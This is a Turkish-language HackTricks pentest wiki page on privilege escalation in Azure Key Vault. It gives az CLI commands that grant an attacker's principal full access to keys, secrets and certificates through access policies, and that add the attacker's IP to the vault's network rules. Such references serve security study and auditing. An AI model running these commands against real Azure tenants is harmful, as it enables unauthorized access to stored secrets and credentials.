# Az - Key Vault Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Azure Key Vault

Bu hizmet hakkında daha fazla bilgi için kontrol edin:

{{#ref}}
../az-services/az-keyvault.md
{{#endref}}

### `Microsoft.KeyVault/vaults/write`

Bu izne sahip bir saldırgan, bir anahtar kasasının politikasını değiştirebilecektir (anahtar kasası RBAC yerine erişim politikalarını kullanmalıdır).
```bash
# If access policies in the output, then you can abuse it
az keyvault show --name <vault-name>

# Get current principal ID
az ad signed-in-user show --query id --output tsv

# Assign all permissions
az keyvault set-policy \
--name <vault-name> \
--object-id <your-object-id> \
--key-permissions all \
--secret-permissions all \
--certificate-permissions all \
--storage-permissions all
```
### Ağ Kısıtlamalarını Değiştir

Hassas verilere (bir sırrın değeri gibi) erişim izniniz olabilir, ancak anahtar kasası belirli bir ağa kısıtlandığı için buna erişemiyor olabilirsiniz. Ağ kısıtlamalarını değiştirme izniniz varsa, IP'nizi izin verilen IP'ler listesine ekleyebilirsiniz.
```bash
# Get the current network restrictions
az keyvault network-rule list --name <vault-name>

# Add your IP to the list
az keyvault network-rule add --name <vault-name> --ip-address <your-ip>
```
{{#include ../../../banners/hacktricks-training.md}}
